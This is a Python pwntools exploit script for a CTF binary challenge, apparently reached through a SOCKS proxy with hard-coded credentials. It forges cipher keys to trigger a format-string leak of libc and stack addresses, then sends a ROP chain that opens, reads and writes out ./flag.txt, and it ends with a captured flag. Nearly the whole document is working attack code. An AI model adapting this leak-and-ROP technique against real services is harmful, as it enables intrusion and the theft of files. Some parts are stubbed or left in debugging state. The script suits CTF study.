#!/usr/bin/env python3
from pwn import *
import socks
import socket

exe = ELF("./chal_patched")
libc = ELF("./libc.so.6", checksec=False)

socks.set_default_proxy(
    socks.SOCKS5,          # loại proxy
    "127.0.0.1",           # host proxy (localhost)
    1080,                  # port proxy
    username="bkisc",
    password="bkisc13579"
)

HOST="172.31.14.13"
PORT=9999

context.binary = exe
context.log_level = 'debug'

gdbscript = '''
# b*$rebase(0x000000000000152E)
b*$rebase(0x00000000000015C0)
b*$rebase(0x0000000000001848)
b*$rebase(0x000000000000170B)
'''

def run():
    if args.LOCAL:
        p = process([exe.path])
        gdb.attach(p, api=True, gdbscript=gdbscript)
    else:
        socket.socket = socks.socksocket
        p = remote(HOST, PORT)

    return p

p = run()
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sna = lambda msg, data: p.sendlineafter(msg, str(data).encode())
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sn = lambda data: p.sendline(str(data).encode())
s = lambda data: p.send(data)
ru = lambda msg: p.recvuntil(msg)
rl = lambda: p.recvline().strip()
rn = lambda n: p.recvn(n)

def gen(target_idx, desired_byte, fmt_string="%45$p"):
    key = bytearray(128)
    S = list(range(128))
    j = 0
    fmt_bytes = fmt_string.encode()
    fmt_len = len(fmt_bytes)
    for i in range(fmt_len):
        key[i] = fmt_bytes[i]
        j = (S[i] + j + key[i]) % 128
        S[i], S[j] = S[j], S[i]
    fix_idx = fmt_len
    needed_k = (-S[fix_idx] - j) % 128
    key[fix_idx] = needed_k
    j = (S[fix_idx] + j + key[fix_idx]) % 128
    S[fix_idx], S[j] = S[j], S[fix_idx]
    trigger = desired_byte
    for i in range(fix_idx + 1, trigger):
        key[i] = (128 - S[i]) % 128
        S[i], S[0] = S[0], S[i]
    key[trigger] = (target_idx - S[trigger]) & 0xff
    next_i = trigger + 1
    if next_i < 128:
        key[next_i] = (-S[next_i] - target_idx) % 128
        for i in range(next_i + 1, 128):
            key[i] = (128 - S[i]) % 128
    return bytes(key)


def gen_auto(targets):
    targets = sorted(targets, key=lambda x: x[1])
    for k in range(len(targets) - 1):
        if targets[k+1][1] <= targets[k][1] + 1:
             raise ValueError(f"Conflict: Byte {hex(targets[k][1])} and {hex(targets[k+1][1])} are too close (gap < 2).")

    key = bytearray(128)
    S = list(range(128))
    j = 0
    last_i = -1 
    
    for target_idx, trigger_byte in targets:
        for i in range(last_i + 1, trigger_byte):
            key[i] = (128 - S[i]) % 128
            S[i], S[0] = S[0], S[i]
        key[trigger_byte] = (target_idx - S[trigger_byte]) & 0xff
        j = target_idx
        if 0 <= j < 128:
            S[trigger_byte], S[j] = S[j], S[trigger_byte]
        reset_idx = trigger_byte + 1
        if reset_idx < 128:
            key[reset_idx] = (-S[reset_idx] - target_idx) % 128
            j = 0
            S[reset_idx], S[0] = S[0], S[reset_idx]
            last_i = reset_idx
        else:
            last_i = 128

    if last_i < 127:
        for i in range(last_i + 1, 128):
            key[i] = (128 - S[i]) % 128
            S[i], S[0] = S[0], S[i]

    return bytes(key)

p.sendafter(b'Enter the key->', gen(-40, 0x47, "\n%45$p"))

p.recvline()
leak = int(p.recvn(14), 16)
libc.address = leak - libc.symbols['__libc_start_main'] - 243

payload2 = gen(-40, 0x47, "\n%35$p")
pause()
p.send(payload2)
p.recvline()
stack = int(p.recvn(14), 16)
log.info(f"libc: {hex(libc.address)}")
log.info(f"stack: {hex(stack)}")
target = stack - 0x1e7 + 0x128
log.info(f"target: {hex(target-0x128)}")
log.info(f"target+0x128: {hex(target)}")
log.info(f"ret_rc4: {hex(target-0x11f)}")
log.info(f"b1: {hex(target&0xff)}, b2: {hex((target>>8)&0xff)}")

my_targets = [
    (-47, (target & 0xff00) >> 8),
    (-48, target & 0x00ff)
]

pop_rdi = libc.address + 0x0000000000023b6a
pop_rsi = libc.address + 0x000000000002601f
pop_rdx_r12 = libc.address + 0x0000000000119431
pop_rcx_rbx = libc.address + 0x000000000010257e
open = libc.symbols['open']
sendfile = libc.symbols['sendfile']
read = libc.symbols['read']
write = libc.symbols['write']

# payload3 = gen_auto(my_targets)
payload3 = b"A"
pause()
p.send(payload3)
path = stack - 0x157
# abc = flat(
#     pop_rdi, path,
#     pop_rsi, 0,
#     pop_rdx_r12, 0, 0,
#     open,
#     pop_rdi, 1,
#     pop_rsi, 3,
#     pop_rdx_r12, 0, 0,
#     pop_rcx_rbx, 0x100, 0,
#     sendfile
# )
abc = flat(
    pop_rdi, path,
    pop_rsi, 0,
    pop_rdx_r12, 0, 0,
    open,
    pop_rdi,      3,
    pop_rsi,      stack,
    pop_rdx_r12,  0x50, 0,
    read,

    pop_rdi,      1,
    pop_rsi,      stack,
    pop_rdx_r12,  0x50, 0,
    write
)
read_more = flat(
    pop_rdi, 0,
    pop_rsi, path+0x78,
    pop_rdx_r12, 0x100, 0,
    read
)
payload4 = b"./flag.txt\x00".ljust(0x38, b'\x00') + read_more
p.sendafter(b'data->', payload4)
pause()
p.send(abc)
p.interactive()

#flag{6WTv7A0crLU5r8r2UneKtxI5eLkQxRE1}